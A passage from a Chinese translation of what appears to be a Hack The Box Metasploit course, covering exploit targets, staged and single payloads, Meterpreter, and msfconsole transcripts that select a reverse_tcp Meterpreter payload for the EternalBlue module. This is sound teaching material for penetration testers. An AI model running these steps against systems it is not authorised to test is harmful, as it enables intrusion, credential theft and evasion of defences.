知道它需要在发起成功攻击之前对给定目标执行服务检测。</p><p>但是，如果我们知道我们的目标上运行的是什么版本，我们可以使用该<code>set target &lt;index no.&gt;</code>命令从列表中选择一个目标。</p><p> MSF - 目标选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">   1   IE 7 on Windows XP SP3</span><br><span class="line">   2   IE 8 on Windows XP SP3</span><br><span class="line">   3   IE 7 on Windows Vista</span><br><span class="line">   4   IE 8 on Windows Vista</span><br><span class="line">   5   IE 8 on Windows 7</span><br><span class="line">   6   IE 9 on Windows 7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; set target 6</span><br><span class="line"></span><br><span class="line">target =&gt; 6</span><br></pre></td></tr></table></figure><h3 id="目标类型"><a href="#目标类型" class="headerlink" title="目标类型"></a>目标类型</h3><p>目标类型多种多样。每个目标都可能因服务包、操作系统版本甚至语言版本而异。这完全取决于目标或漏洞利用模块中的返回地址和其他参数。</p><p>返回地址可能会有所不同，因为特定的语言包更改了地址，有不同的软件版本可用，或者地址因挂钩而移动。这完全取决于识别目标所需的返回地址类型。该地址可以是<code>jmp esp</code>，跳转到标识目标的特定寄存器，或<code>pop/pop/ret</code>. 有关返回地址主题的更多信息，请参阅<a href="https://academy.hackthebox.com/module/89/section/931">Windows x86</a>模块上基于堆栈的缓冲区溢出。利用模块代码中的注释可以帮助我们确定目标的定义。</p><p>要正确识别目标，我们需要：</p><ul><li>获取目标二进制文件的副本</li><li>使用 msfpescan 找到合适的返回地址</li></ul><p>在本模块的后面，我们将更深入地研究漏洞利用开发、有效负载生成和目标识别。</p><h2 id="有效载荷"><a href="#有效载荷" class="headerlink" title="有效载荷"></a>有效载荷</h2><p>Metasploit 中的A<code>Payload</code>指的是帮助漏洞利用模块（通常）将 shell 返回给攻击者的模块。有效载荷与漏洞本身一起发送，以绕过易受攻击服务的标准功能程序 ( <code>exploits job</code>)，然后在目标操作系统上运行，通常向攻击者返回反向连接并建立立足点 ( <code>payload&#39;s job</code>)。</p><p>Metasploit 框架中有三种不同类型的有效载荷模块：Singles、Stagers 和 Stages。使用三种有效载荷交互类型将被证明对渗透测试者有益。它可以提供我们执行某些类型任务所需的灵活性。有效载荷是否暂存由<code>/</code>有效载荷名称表示。</p><p>例如，<code>windows/shell_bind_tcp</code>是一个没有阶段的单个有效载荷，而<code>windows/shell/bind_tcp</code>由一个 stager ( <code>bind_tcp</code>) 和一个阶段 ( <code>shell</code>) 组成。</p><h3 id="Singles"><a href="#Singles" class="headerlink" title="Singles"></a>Singles</h3><p>有效负载<code>Single</code>包含所选任务的漏洞和整个 shellcode。内联有效载荷在设计上比同类有效载荷更稳定，因为它们包含所有内容。然而，一些漏洞利用将不支持这些有效负载的最终大小，因为它们可能会变得非常大。<code>Singles</code>是独立的有效载荷。它们是在目标系统上发送和执行的唯一对象，运行后立即得到结果。单个有效负载可以像将用户添加到目标系统或启动进程一样简单。</p><h3 id="stager"><a href="#stager" class="headerlink" title="stager"></a>stager</h3><p><code>Stager</code>payloads 与 Stage payloads 一起工作来执行特定的任务。一个 Stager 在攻击者机器上等待，准备在该阶段在远程主机上完成运行后与受害主机建立连接。<code>Stagers</code>通常用于在攻击者和受害者之间建立网络连接，并且设计得小巧可靠。Metasploit 将使用最好的一个，并在必要时退回到不太喜欢的那个。</p><p>Windows NX 与 NO-NX Stagers</p><ul><li>NX CPU 和 DEP 的可靠性问题</li><li>NX stagers 更大（VirtualAlloc 内存）</li><li>现在默认为 NX + Win7 兼容</li></ul><h3 id="stages"><a href="#stages" class="headerlink" title="stages"></a>stages</h3><p><code>Stages</code>是由 stager 的模块下载的有效负载组件。各种有效负载阶段提供没有大小限制的高级功能，例如 Meterpreter、VNC 注入等。有效载荷阶段自动使用中间阶段：</p><ul><li>一个单一的<code>recv()</code>失败与大的有效载荷</li><li>Stager 接收中间 stager</li><li>中间的 Stager 然后执行完整的下载</li><li>对 RWX 也更好</li></ul><h2 id="分阶段有效载荷"><a href="#分阶段有效载荷" class="headerlink" title="分阶段有效载荷"></a>分阶段有效载荷</h2><p>简单地说，分阶段有效载荷是一种<code>exploitation process</code>模块化且功能分离的有效载荷，有助于将其完成的不同功能隔离到不同的代码块中，每个代码块单独完成其目标，但致力于将攻击链接在一起。如果所有阶段都正常工作，这最终将授予攻击者远程访问目标机器的权限。</p><p>与任何其他有效负载一样，除了授予对目标系统的 shell 访问权限外，此有效负载的范围应尽可能紧凑和不显眼，以尽可能地帮助防病毒 () &#x2F; 入侵防御系统 () 规避<code>AV</code>。<code>IPS</code></p><p><code>Stage0</code>分段有效载荷的一部分表示通过网络发送到目标机器易受攻击的服务的初始 shellcode，其唯一目的是初始化与攻击者机器的连接。这就是所谓的反向连接。作为 Metasploit 用户，我们会遇到这些通用名称<code>reverse_tcp</code>、<code>reverse_https</code>和<code>bind_tcp</code>。例如，在<code>show payloads</code>命令下，您可以查找如下所示的有效负载：</p><h4 id="MSF-分阶段有效载荷"><a href="#MSF-分阶段有效载荷" class="headerlink" title="MSF - 分阶段有效载荷"></a>MSF - 分阶段有效载荷</h4><p> MSF - 分阶段有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; show payloads</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager</span><br><span class="line">536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support</span><br><span class="line">537  windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager</span><br><span class="line">538  windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager</span><br><span class="line">539  windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">540  windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)</span><br><span class="line">541  windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">542  windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">543  windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">544  windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">545  windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">546  windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">547  windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)</span><br><span class="line">548  windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>​反向连接不太可能触发预防系统，例如初始化连接的是受害者主机，该主机大部分时间驻留在所谓的<code>security trust zone</code>. 然而，当然，网络的安全设备和人员不会盲目地遵循这种信任策略，因此即使是在这一步，攻击者也必须谨慎行事。</p><p>​Stage0 代码还旨在在到达后将更大的后续有效负载读入内存。在攻击者和受害者之间建立稳定的通信通道后，攻击者机器很可能会发送一个更大的有效载荷阶段，这应该授予他们 shell 访问权限。这个更大的有效载荷将是<code>Stage1</code>有效载荷。我们将在后面的部分中进行更详细的介绍。</p><h4 id="Meterpreter-载荷"><a href="#Meterpreter-载荷" class="headerlink" title="Meterpreter 载荷"></a>Meterpreter 载荷</h4><p>有效载荷<code>Meterpreter</code>是一种特定类型的多面有效载荷，用于<code>DLL injection</code>确保与受害主机的连接稳定，难以通过简单检查检测到，并在重启或系统更改后保持不变。Meterpreter 完全驻留在远程主机的内存中，不会在硬盘上留下任何痕迹，因此很难用传统的取证技术进行检测。此外，脚本和插件可以<code>loaded and unloaded</code>根据需要动态配置。</p><p>一旦执行了 Meterpreter 负载，就会创建一个新会话，它会生成 Meterpreter 接口。它与 msfconsole 界面非常相似，但所有可用的命令都是针对目标系统的，有效负载已“感染”该系统。它为我们提供了大量有用的命令，从击键捕获、密码哈希收集、麦克风窃听和屏幕截图到模拟进程安全令牌。我们将在后面的部分中深入研究有关 Meterpreter 的更多细节。</p><p>使用 Meterpreter，我们还可以<code>load</code>在不同的 Plugins 中协助我们进行评估。我们将在本模块的插件部分详细讨论这些内容。</p><h2 id="搜索有效载荷"><a href="#搜索有效载荷" class="headerlink" title="搜索有效载荷"></a>搜索有效载荷</h2><p>​要选择我们的第一个有效载荷，我们需要知道我们想在目标机器上做什么。例如，如果我们要访问持久化，我们可能会想要选择一个 Meterpreter 负载。</p><p>如上所述，Meterpreter 有效负载为我们提供了极大的灵活性。它们的基本功能已经非常广泛且具有影响力。我们可以自动化并快速交付与渗透测试的<a href="https://github.com/gentilkiwi/mimikatz">GentilKiwi 的 Mimikatz 插件</a>等插件相结合的部分，同时保持有组织、高效的评估。要查看所有可用的有效负载，请使用<code>show payloads</code>中的命令<code>msfconsole</code>。</p><h4 id="MSF-列出有效载荷"><a href="#MSF-列出有效载荷" class="headerlink" title="MSF - 列出有效载荷"></a>MSF - 列出有效载荷</h4><p> MSF - 列出有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; show payloads</span><br><span class="line"></span><br><span class="line">Payloads</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">   #    Name                                                Disclosure Date  Rank    Check  Description</span><br><span class="line">-    ----                                                ---------------  ----    -----  -----------</span><br><span class="line">   0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline</span><br><span class="line">   1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline</span><br><span class="line">   2    aix/ppc/shell_interact                                               manual  No     AIX execve Shell for inetd</span><br><span class="line">   3    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline</span><br><span class="line">   4    android/meterpreter/reverse_http                                     manual  No     Android Meterpreter, Android Reverse HTTP Stager</span><br><span class="line">   5    android/meterpreter/reverse_https                                    manual  No     Android Meterpreter, Android Reverse HTTPS Stager</span><br><span class="line">   6    android/meterpreter/reverse_tcp                                      manual  No     Android Meterpreter, Android Reverse TCP Stager</span><br><span class="line">   7    android/meterpreter_reverse_http                                     manual  No     Android Meterpreter Shell, Reverse HTTP Inline</span><br><span class="line">   8    android/meterpreter_reverse_https                                    manual  No     Android Meterpreter Shell, Reverse HTTPS Inline</span><br><span class="line">   9    android/meterpreter_reverse_tcp                                      manual  No     Android Meterpreter Shell, Reverse TCP Inline</span><br><span class="line">   10   android/shell/reverse_http                                           manual  No     Command Shell, Android Reverse HTTP Stager</span><br><span class="line">   11   android/shell/reverse_https                                          manual  No     Command Shell, Android Reverse HTTPS Stager</span><br><span class="line">   12   android/shell/reverse_tcp                                            manual  No     Command Shell, Android Reverse TCP Stager</span><br><span class="line">   13   apple_ios/aarch64/meterpreter_reverse_http                           manual  No     Apple_iOS Meterpreter, Reverse HTTP Inline</span><br><span class="line">   </span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">   </span><br><span class="line">   557  windows/x64/vncinject/reverse_tcp                                    manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager</span><br><span class="line">   558  windows/x64/vncinject/reverse_tcp_rc4                                manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   559  windows/x64/vncinject/reverse_tcp_uuid                               manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">   560  windows/x64/vncinject/reverse_winhttp                                manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)</span><br><span class="line">   561  windows/x64/vncinject/reverse_winhttps                               manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)</span><br></pre></td></tr></table></figure><p>​如上所示，有很多可用的有效载荷可供选择。不仅如此，我们还可以使用创建我们的有效载荷<code>msfvenom</code>，但我们稍后会深入探讨。我们将使用与以前相同的目标，而不是使用默认的有效载荷，这是一个简单的<code>reverse_tcp_shell</code>，我们将使用一个<code>Meterpreter Payload for Windows 7(x64)</code>.</p><p>滚动上面的列表，我们找到包含<code>Meterpreter Payloads for Windows(x64)</code>.</p><p> MSF - 列出有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">515  windows/x64/meterpreter/bind_ipv6_tcp                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager</span><br><span class="line">516  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support</span><br><span class="line">517  windows/x64/meterpreter/bind_named_pipe                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager</span><br><span class="line">518  windows/x64/meterpreter/bind_tcp                                     manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager</span><br><span class="line">519  windows/x64/meterpreter/bind_tcp_rc4                                 manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">520  windows/x64/meterpreter/bind_tcp_uuid                                manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)</span><br><span class="line">521  windows/x64/meterpreter/reverse_http                                 manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">522  windows/x64/meterpreter/reverse_https                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">523  windows/x64/meterpreter/reverse_named_pipe                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">524  windows/x64/meterpreter/reverse_tcp                                  manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">525  windows/x64/meterpreter/reverse_tcp_rc4                              manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">526  windows/x64/meterpreter/reverse_tcp_uuid                             manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">527  windows/x64/meterpreter/reverse_winhttp                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)</span><br><span class="line">528  windows/x64/meterpreter/reverse_winhttps                             manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)</span><br><span class="line">529  windows/x64/meterpreter_bind_named_pipe                              manual  No     Windows Meterpreter Shell, Bind Named Pipe Inline (x64)</span><br><span class="line">530  windows/x64/meterpreter_bind_tcp                                     manual  No     Windows Meterpreter Shell, Bind TCP Inline (x64)</span><br><span class="line">531  windows/x64/meterpreter_reverse_http                                 manual  No     Windows Meterpreter Shell, Reverse HTTP Inline (x64)</span><br><span class="line">532  windows/x64/meterpreter_reverse_https                                manual  No     Windows Meterpreter Shell, Reverse HTTPS Inline (x64)</span><br><span class="line">533  windows/x64/meterpreter_reverse_ipv6_tcp                             manual  No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)</span><br><span class="line">534  windows/x64/meterpreter_reverse_tcp                                  manual  No     Windows Meterpreter Shell, Reverse TCP Inline x64</span><br></pre></td></tr></table></figure><p>正如我们所见，在如此庞大的列表中找到所需的有效负载可能非常耗时。我们还可以使用<code>grep</code>in<code>msfconsole</code>来过滤掉特定的术语。这将加快搜索速度，从而加快我们的选择速度。</p><p>我们必须<code>grep</code>在开头输入带有相应参数的命令，然后输入要进行过滤的命令。例如，让我们假设我们希望为我们的漏洞利用处理一个<code>TCP</code>基础。因此，我们可以首先搜索有效负载中包含该词的所有结果。<code>reverse shell``Meterpreter``Meterpreter</code></p><h4 id="MSF-搜索特定有效载荷"><a href="#MSF-搜索特定有效载荷" class="headerlink" title="MSF - 搜索特定有效载荷"></a>MSF - 搜索特定有效载荷</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter show payloads</span><br><span class="line"></span><br><span class="line">   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager</span><br><span class="line">   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support</span><br><span class="line">   8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager</span><br><span class="line">   9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager</span><br><span class="line">   10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)</span><br><span class="line">   12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">   13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">   14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">   18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)</span><br><span class="line">   19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep -c meterpreter show payloads</span><br><span class="line"></span><br><span class="line">[*] 14</span><br></pre></td></tr></table></figure><p>这给了我们一个总的<code>14</code>结果。现在我们可以在第一个命令之后添加另一个<code>grep</code>命令并搜索<code>reverse_tcp</code>.</p><p> MSF - 搜索特定有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter grep reverse_tcp show payloads</span><br><span class="line"></span><br><span class="line">   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep -c meterpreter grep reverse_tcp show payloads</span><br><span class="line"></span><br><span class="line">[*] 3</span><br></pre></td></tr></table></figure><p>在 的帮助下<code>grep</code>，我们将我们想要的有效载荷列表减少到更少。当然，该<code>grep</code>命令可用于所有其他命令。我们只需要知道我们在寻找什么。</p><h2 id="选择有效载荷"><a href="#选择有效载荷" class="headerlink" title="选择有效载荷"></a>选择有效载荷</h2><p>与模块一样，我们需要我们想要使用的条目的索引号。要为当前选定的模块设置有效负载，我们<code>set payload &lt;no.&gt;</code>仅在选择一个漏洞利用模块后才使用。</p><h4 id="MSF-选择负载"><a href="#MSF-选择负载" class="headerlink" title="MSF - 选择负载"></a>MSF - 选择负载</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter grep reverse_tcp show payloads</span><br><span class="line"></span><br><span class="line">   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 15</span><br><span class="line"></span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p>选择有效载荷后，我们将有更多选择。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 